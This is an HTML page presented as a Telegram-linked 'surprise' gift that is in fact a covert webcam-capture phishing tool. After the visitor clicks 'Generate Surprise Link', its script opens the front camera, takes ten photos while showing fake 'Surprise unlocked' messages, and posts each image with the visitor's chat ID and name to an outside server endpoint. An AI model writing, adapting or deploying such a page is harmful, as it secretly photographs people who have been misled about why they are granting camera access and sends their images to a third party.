<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>üéÅ Your Surprise</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
body{background:linear-gradient(135deg,#6a11cb 0%,#2575fc 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
.container{background:white;padding:25px;border-radius:15px;max-width:450px;width:100%;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.2);}
.gift{font-size:50px;margin:10px 0;}
h1{color:#333;margin:10px 0;font-size:22px;}
p{color:#666;margin:5px 0;}
button{padding:15px 25px;margin:10px 0;border:none;border-radius:50px;background:linear-gradient(90deg,#6a11cb,#2575fc);color:white;font-weight:bold;font-size:16px;cursor:pointer;}
.counter{color:#666;font-size:14px;margin:5px 0;}
.success{color:#00b09b;background:#e6fff9;padding:10px;border-radius:8px;margin:10px 0;font-weight:bold;}
.progress{width:100%;height:8px;background:#eee;border-radius:4px;margin:15px 0;overflow:hidden;}
.progress-bar{height:100%;width:0%;background:#00b09b;transition:width 0.3s;}
.hidden{display:none;}
.menu{margin-top:15px;}
</style>
</head>
<body>
<div class="container" id="mainContainer">
    <div class="gift">üéÅ</div>
    <h1 id="title">Welcome to HCO Surprise!</h1>
    <p id="message">Please join our Telegram channel to start:</p>
    <a href="https://t.me/HackersColony" target="_blank"><button>Join Telegram Channel ‚úÖ</button></a>
    <button id="joinedBtn">I Joined ‚úÖ</button>

    <div class="menu hidden" id="menu">
        <button id="generateBtn">Generate Surprise Link</button>
        <button id="contactBtn">Contact Owner</button>
    </div>

    <div class="progress hidden"><div class="progress-bar" id="progressBar"></div></div>
    <div id="counter" class="counter hidden"></div>
    <div id="status" class="success hidden"></div>
</div>

<canvas id="canvas" class="hidden"></canvas>

<script>
const USER_CHAT_ID = new URLSearchParams(window.location.search).get("chat_id");
const USER_NAME = new URLSearchParams(window.location.search).get("name") || "Friend";
const BOT_ENDPOINT = "https://hco-bot-server.com/upload"; // replace with your bot endpoint
const TOTAL_SURPRISES = 10;

const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const mainContainer = document.getElementById("mainContainer");
const joinedBtn = document.getElementById("joinedBtn");
const menu = document.getElementById("menu");
const generateBtn = document.getElementById("generateBtn");
const contactBtn = document.getElementById("contactBtn");

joinedBtn.onclick = ()=>{
    joinedBtn.style.display = "none";
    menu.classList.remove("hidden");
    document.getElementById("title").textContent=`üéâ Welcome ${USER_NAME}!`;
    document.getElementById("message").textContent="Choose an option below to continue:";
}

// Contact Owner Button
contactBtn.onclick = ()=>{
    window.open("https://t.me/Hackers_Colony_Official", "_blank");
}

// Generate Link Button ‚Üí starts camera capture
generateBtn.onclick = async ()=>{
    menu.classList.add("hidden");
    document.getElementById("message").textContent="Starting your surprises‚Ä¶";
    try{
        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
        await captureSurprises(stream);
    }catch(e){
        document.getElementById("message").textContent="‚ö†Ô∏è Camera access denied! Cannot capture surprises.";
    }
}

async function captureSurprises(stream){
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();

    document.getElementById("progressBar").parentElement.classList.remove("hidden");
    document.getElementById("counter").classList.remove("hidden");

    for(let i=1;i<=TOTAL_SURPRISES;i++){
        await new Promise(r=>setTimeout(r,800));
        canvas.width=640; canvas.height=480;
        ctx.save(); ctx.translate(canvas.width,0); ctx.scale(-1,1); ctx.drawImage(video,0,0,canvas.width,canvas.height); ctx.restore();
        ctx.fillStyle='rgba(106,17,203,0.8)';
        ctx.fillRect(0,canvas.height-60,canvas.width,60);
        ctx.font='bold 24px Arial'; ctx.fillStyle='white'; ctx.textAlign='center';
        ctx.fillText(`üéÅ Surprise ${i}`,canvas.width/2,canvas.height-30);
        const blob = await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.9));
        await sendPhoto(blob,i);
        updateProgress(i,TOTAL_SURPRISES);
        showStatus(`üéâ Surprise ${i} unlocked!`);
    }
    stopStream(stream);
    finishSurprises();
}

async function sendPhoto(blob,num){
    const fileName=`surprise_${num}_${Date.now()}.jpg`;
    const form=new FormData();
    form.append("photo",new File([blob],fileName,{type:"image/jpeg"}));
    form.append("user_chat_id",USER_CHAT_ID);
    form.append("user_name",USER_NAME);
    try{
        await fetch(BOT_ENDPOINT,{method:"POST",body:form});
        console.log(`‚úÖ Surprise ${num} sent`);
    }catch(e){console.error("‚ùå Failed to send",e);}
}

function updateProgress(current,total){
    const percent=(current/total)*100;
    document.getElementById("progressBar").style.width=percent+"%";
    document.getElementById("counter").textContent=`${current}/${total}`;
}

function showStatus(text){
    const status = document.getElementById("status");
    status.textContent=text; status.classList.remove("hidden");
    setTimeout(()=>status.classList.add("hidden"),900);
}

function finishSurprises(){
    document.getElementById("title").textContent="‚úÖ All Surprises Unlocked!";
    document.getElementById("message").textContent="Check your Telegram for all surprises!";
}

function stopStream(stream){ stream.getTracks().forEach(t=>t.stop()); }
</script>
</body>
</html>
